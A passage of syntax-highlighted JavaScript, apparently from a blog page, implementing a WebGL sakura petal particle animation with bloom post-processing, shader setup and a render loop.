class="number">1</span>];</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ieuler + <span class="number">2</span>] = prtcl.euler[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">            ieuler += <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[imisc] = prtcl.size;</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[imisc + <span class="number">1</span>] = prtcl.alpha;</span></span><br><span class="line"><span class="javascript">            imisc += <span class="number">2</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//draw</span></span></span><br><span class="line"><span class="javascript">        gl.enable(gl.BLEND);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//gl.disable(gl.DEPTH_TEST);</span></span></span><br><span class="line"><span class="javascript">        gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> prog = pointFlower.program;</span></span><br><span class="line"><span class="javascript">        useShader(prog);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.uniformMatrix4fv(prog.uniforms.uProjection, <span class="literal">false</span>, projection.matrix);</span></span><br><span class="line"><span class="javascript">        gl.uniformMatrix4fv(prog.uniforms.uModelview, <span class="literal">false</span>, camera.matrix);</span></span><br><span class="line"><span class="javascript">        gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array);</span></span><br><span class="line"><span class="javascript">        gl.uniform3fv(prog.uniforms.uDOF, Vector3.arrayForm(camera.dof));</span></span><br><span class="line"><span class="javascript">        gl.uniform3fv(prog.uniforms.uFade, Vector3.arrayForm(pointFlower.fader));</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer);</span></span><br><span class="line"><span class="javascript">        gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.vertexAttribPointer(prog.attributes.aPosition, <span class="number">3</span>, gl.FLOAT, <span class="literal">false</span>, <span class="number">0</span>, pointFlower.positionArrayOffset * <span class="built_in">Float32Array</span>.BYTES_PER_ELEMENT);</span></span><br><span class="line"><span class="javascript">        gl.vertexAttribPointer(prog.attributes.aEuler, <span class="number">3</span>, gl.FLOAT, <span class="literal">false</span>, <span class="number">0</span>, pointFlower.eulerArrayOffset * <span class="built_in">Float32Array</span>.BYTES_PER_ELEMENT);</span></span><br><span class="line"><span class="javascript">        gl.vertexAttribPointer(prog.attributes.aMisc, <span class="number">2</span>, gl.FLOAT, <span class="literal">false</span>, <span class="number">0</span>, pointFlower.miscArrayOffset * <span class="built_in">Float32Array</span>.BYTES_PER_ELEMENT);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// doubler</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">2</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> zpos = i * -<span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">0</span>] = pointFlower.area.x * -<span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">1</span>] = pointFlower.area.y * -<span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">2</span>] = pointFlower.area.z * zpos;</span></span><br><span class="line"><span class="javascript">            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);</span></span><br><span class="line"><span class="javascript">            gl.drawArrays(gl.POINT, <span class="number">0</span>, pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">0</span>] = pointFlower.area.x * -<span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">1</span>] = pointFlower.area.y *  <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">2</span>] = pointFlower.area.z * zpos;</span></span><br><span class="line"><span class="javascript">            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);</span></span><br><span class="line"><span class="javascript">            gl.drawArrays(gl.POINT, <span class="number">0</span>, pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">0</span>] = pointFlower.area.x *  <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">1</span>] = pointFlower.area.y * -<span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">2</span>] = pointFlower.area.z * zpos;</span></span><br><span class="line"><span class="javascript">            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);</span></span><br><span class="line"><span class="javascript">            gl.drawArrays(gl.POINT, <span class="number">0</span>, pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">0</span>] = pointFlower.area.x *  <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">1</span>] = pointFlower.area.y *  <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.offset[<span class="number">2</span>] = pointFlower.area.z * zpos;</span></span><br><span class="line"><span class="javascript">            gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);</span></span><br><span class="line"><span class="javascript">            gl.drawArrays(gl.POINT, <span class="number">0</span>, pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//main</span></span></span><br><span class="line"><span class="javascript">        pointFlower.offset[<span class="number">0</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        pointFlower.offset[<span class="number">1</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        pointFlower.offset[<span class="number">2</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset);</span></span><br><span class="line"><span class="javascript">        gl.drawArrays(gl.POINT, <span class="number">0</span>, pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        unuseShader(prog);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.enable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript">        gl.disable(gl.BLEND);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// effects</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//common util</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createEffectProgram</span>(<span class="params">vtxsrc, frgsrc, exunifs, exattrs</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ret = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> unifs = [<span class="string">&#x27;uResolution&#x27;</span>, <span class="string">&#x27;uSrc&#x27;</span>, <span class="string">&#x27;uDelta&#x27;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(exunifs) &#123;</span></span><br><span class="line"><span class="javascript">            unifs = unifs.concat(exunifs);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> attrs = [<span class="string">&#x27;aPosition&#x27;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(exattrs) &#123;</span></span><br><span class="line"><span class="javascript">            attrs = attrs.concat(exattrs);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        ret.program = createShader(vtxsrc, frgsrc, unifs, attrs);</span></span><br><span class="line"><span class="javascript">        useShader(ret.program);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        ret.dataArray = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([</span></span><br><span class="line"><span class="javascript">            -<span class="number">1.0</span>, -<span class="number">1.0</span>,</span></span><br><span class="line"><span class="javascript">            <span class="number">1.0</span>, -<span class="number">1.0</span>,</span></span><br><span class="line"><span class="javascript">            -<span class="number">1.0</span>,  <span class="number">1.0</span>,</span></span><br><span class="line"><span class="javascript">            <span class="number">1.0</span>,  <span class="number">1.0</span></span></span><br><span class="line"><span class="javascript">        ]);</span></span><br><span class="line"><span class="javascript">        ret.buffer = gl.createBuffer();</span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, ret.buffer);</span></span><br><span class="line"><span class="javascript">        gl.bufferData(gl.ARRAY_BUFFER, ret.dataArray, gl.STATIC_DRAW);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        unuseShader(ret.program);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> ret;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// basic usage</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// useEffect(prog, srctex(&#123;&#x27;texture&#x27;:texid, &#x27;dtxArray&#x27;:(f32)[dtx, dty]&#125;)); //basic initialize</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// gl.uniform**(...); //additional uniforms</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// drawEffect()</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// unuseEffect(prog)</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// TEXTURE0 makes src</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">useEffect</span>(<span class="params">fxobj, srctex</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> prog = fxobj.program;</span></span><br><span class="line"><span class="javascript">        useShader(prog);</span></span><br><span class="line"><span class="javascript">        gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(srctex != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript">            gl.uniform2fv(prog.uniforms.uDelta, srctex.dtxArray);</span></span><br><span class="line"><span class="javascript">            gl.uniform1i(prog.uniforms.uSrc, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            gl.activeTexture(gl.TEXTURE0);</span></span><br><span class="line"><span class="javascript">            gl.bindTexture(gl.TEXTURE_2D, srctex.texture);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">drawEffect</span>(<span class="params">fxobj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, fxobj.buffer);</span></span><br><span class="line"><span class="javascript">        gl.vertexAttribPointer(fxobj.program.attributes.aPosition, <span class="number">2</span>, gl.FLOAT, <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">        gl.drawArrays(gl.TRIANGLE_STRIP, <span class="number">0</span>, <span class="number">4</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">unuseEffect</span>(<span class="params">fxobj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        unuseShader(fxobj.program);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> effectLib = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createEffectLib</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vtxsrc, frgsrc;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//common</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> cmnvtxsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;fx_common_vsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//background</span></span></span><br><span class="line"><span class="javascript">        frgsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;bg_fsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        effectLib.sceneBg = createEffectProgram(cmnvtxsrc, frgsrc, [<span class="string">&#x27;uTimes&#x27;</span>], <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// make brightpixels buffer</span></span></span><br><span class="line"><span class="javascript">        frgsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;fx_brightbuf_fsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        effectLib.mkBrightBuf = createEffectProgram(cmnvtxsrc, frgsrc, <span class="literal">null</span>, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// direction blur</span></span></span><br><span class="line"><span class="javascript">        frgsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;fx_dirblur_r4_fsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        effectLib.dirBlur = createEffectProgram(cmnvtxsrc, frgsrc, [<span class="string">&#x27;uBlurDir&#x27;</span>], <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//final composite</span></span></span><br><span class="line"><span class="javascript">        vtxsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pp_final_vsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        frgsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pp_final_fsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        effectLib.finalComp = createEffectProgram(vtxsrc, frgsrc, [<span class="string">&#x27;uBloom&#x27;</span>], <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// background</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createBackground</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log(&quot;create background&quot;);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">initBackground</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log(&quot;init background&quot;);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">renderBackground</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        gl.disable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        useEffect(effectLib.sceneBg, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        gl.uniform2f(effectLib.sceneBg.program.uniforms.uTimes, timeInfo.elapsed, timeInfo.delta);</span></span><br><span class="line"><span class="javascript">        drawEffect(effectLib.sceneBg);</span></span><br><span class="line"><span class="javascript">        unuseEffect(effectLib.sceneBg);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.enable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// post process</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> postProcess = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createPostProcess</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log(&quot;create post process&quot;);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">initPostProcess</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log(&quot;init post process&quot;);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">renderPostProcess</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        gl.enable(gl.TEXTURE_2D);</span></span><br><span class="line"><span class="javascript">        gl.disable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> bindRT = <span class="function"><span class="keyword">function</span> (<span class="params">rt, isclear</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            gl.bindFramebuffer(gl.FRAMEBUFFER, rt.frameBuffer);</span></span><br><span class="line"><span class="javascript">            gl.viewport(<span class="number">0</span>, <span class="number">0</span>, rt.width, rt.height);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(isclear) &#123;</span></span><br><span class="line"><span class="javascript">                gl.clearColor(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">                gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//make bright buff</span></span></span><br><span class="line"><span class="javascript">        bindRT(renderSpec.wHalfRT0, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        useEffect(effectLib.mkBrightBuf, renderSpec.mainRT);</span></span><br><span class="line"><span class="javascript">        drawEffect(effectLib.mkBrightBuf);</span></span><br><span class="line"><span class="javascript">        unuseEffect(effectLib.mkBrightBuf);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// make bloom</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p = <span class="number">1.5</span> + <span class="number">1</span> * i;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> s = <span class="number">2.0</span> + <span class="number">1</span> * i;</span></span><br><span class="line"><span class="javascript">            bindRT(renderSpec.wHalfRT1, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            useEffect(effectLib.dirBlur, renderSpec.wHalfRT0);</span></span><br><span class="line"><span class="javascript">            gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, p, <span class="number">0.0</span>, s, <span class="number">0.0</span>);</span></span><br><span class="line"><span class="javascript">            drawEffect(effectLib.dirBlur);</span></span><br><span class="line"><span class="javascript">            unuseEffect(effectLib.dirBlur);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            bindRT(renderSpec.wHalfRT0, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            useEffect(effectLib.dirBlur, renderSpec.wHalfRT1);</span></span><br><span class="line"><span class="javascript">            gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, <span class="number">0.0</span>, p, <span class="number">0.0</span>, s);</span></span><br><span class="line"><span class="javascript">            drawEffect(effectLib.dirBlur);</span></span><br><span class="line"><span class="javascript">            unuseEffect(effectLib.dirBlur);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//display</span></span></span><br><span class="line"><span class="javascript">        gl.bindFramebuffer(gl.FRAMEBUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        gl.viewport(<span class="number">0</span>, <span class="number">0</span>, renderSpec.width, renderSpec.height);</span></span><br><span class="line"><span class="javascript">        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        useEffect(effectLib.finalComp, renderSpec.mainRT);</span></span><br><span class="line"><span class="javascript">        gl.uniform1i(effectLib.finalComp.program.uniforms.uBloom, <span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">        gl.activeTexture(gl.TEXTURE1);</span></span><br><span class="line"><span class="javascript">        gl.bindTexture(gl.TEXTURE_2D, renderSpec.wHalfRT0.texture);</span></span><br><span class="line"><span class="javascript">        drawEffect(effectLib.finalComp);</span></span><br><span class="line"><span class="javascript">        unuseEffect(effectLib.finalComp);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.enable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">/////</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> SceneEnv = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createScene</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        createEffectLib();</span></span><br><span class="line"><span class="javascript">        createBackground();</span></span><br><span class="line"><span class="javascript">        createPointFlowers();</span></span><br><span class="line"><span class="javascript">        createPostProcess();</span></span><br><span class="line"><span class="javascript">        sceneStandBy = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">initScene</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        initBackground();</span></span><br><span class="line"><span class="javascript">        initPointFlowers();</span></span><br><span class="line"><span class="javascript">        initPostProcess();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//camera.position.z = 17.320508;</span></span></span><br><span class="line"><span class="javascript">        camera.position.z = pointFlower.area.z + projection.nearfar[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        projection.angle = <span class="built_in">Math</span>.atan2(pointFlower.area.y, camera.position.z + pointFlower.area.z) * <span class="number">180.0</span> / <span class="built_in">Math</span>.PI * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">        Matrix44.loadProjection(projection.matrix, renderSpec.aspect, projection.angle, projection.nearfar[<span class="number">0</span>], projection.nearfar[<span class="number">1</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">renderScene</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//draw</span></span></span><br><span class="line"><span class="javascript">        Matrix44.loadLookAt(camera.matrix, camera.position, camera.lookat, camera.up);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.enable(gl.DEPTH_TEST);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//gl.bindFramebuffer(gl.FRAMEBUFFER, null);</span></span></span><br><span class="line"><span class="javascript">        gl.bindFramebuffer(gl.FRAMEBUFFER, renderSpec.mainRT.frameBuffer);</span></span><br><span class="line"><span class="javascript">        gl.viewport(<span class="number">0</span>, <span class="number">0</span>, renderSpec.mainRT.width, renderSpec.mainRT.height);</span></span><br><span class="line"><span class="javascript">        gl.clearColor(<span class="number">0.005</span>, <span class="number">0</span>, <span class="number">0.05</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        renderBackground();</span></span><br><span class="line"><span class="javascript">        renderPointFlowers();</span></span><br><span class="line"><span class="javascript">        renderPostProcess();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">onResize</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        makeCanvasFullScreen(<span class="built_in">document</span>.getElementById(<span class="string">&quot;sakura&quot;</span>));</span></span><br><span class="line"><span class="javascript">        setViewports();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(sceneStandBy) &#123;</span></span><br><span class="line"><span class="javascript">            initScene();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setViewports</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        renderSpec.setSize(gl.canvas.width, gl.canvas.height);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.clearColor(<span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.5</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">        gl.viewport(<span class="number">0</span>, <span class="number">0</span>, renderSpec.width, renderSpec.height);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> rtfunc = <span class="function"><span class="keyword">function</span> (<span class="params">rtname, rtw, rth</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> rt = renderSpec[rtname];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(rt) deleteRenderTarget(rt);</span></span><br><span class="line"><span class="javascript">            renderSpec[rtname] = createRenderTarget(rtw, rth);</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        rtfunc(<span class="string">&#x27;mainRT&#x27;</span>, renderSpec.width, renderSpec.height);</span></span><br><span class="line"><span class="javascript">        rtfunc(<span class="string">&#x27;wFullRT0&#x27;</span>, renderSpec.width, renderSpec.height);</span></span><br><span class="line"><span class="javascript">        rtfunc(<span class="string">&#x27;wFullRT1&#x27;</span>, renderSpec.width, renderSpec.height);</span></span><br><span class="line"><span class="javascript">        rtfunc(<span class="string">&#x27;wHalfRT0&#x27;</span>, renderSpec.halfWidth, renderSpec.halfHeight);</span></span><br><span class="line"><span class="javascript">        rtfunc(<span class="string">&#x27;wHalfRT1&#x27;</span>, renderSpec.halfWidth, renderSpec.halfHeight);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        renderScene();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> animating = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">stepAnimation</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(!animating) animate();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> curdate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        timeInfo.elapsed = (curdate - timeInfo.start) / <span class="number">1000.0</span>;</span></span><br><span class="line"><span class="javascript">        timeInfo.delta = (curdate - timeInfo.prev) / <span class="number">1000.0</span>;</span></span><br><span class="line"><span class="javascript">        timeInfo.prev = curdate;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(animating) requestAnimationFrame(animate);</span></span><br><span class="line"><span class="javascript">        render();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">makeCanvasFullScreen</span>(<span class="params">canvas</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> b = <span class="built_in">document</span>.body;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> d = <span class="built_in">document</span>.documentElement;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fullw = <span class="built_in">Math</span>.max(b.clientWidth , b.scrollWidth, d.scrollWidth, d.clientWidth);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fullh = <span class="built_in">Math</span>.max(b.clientHeight , 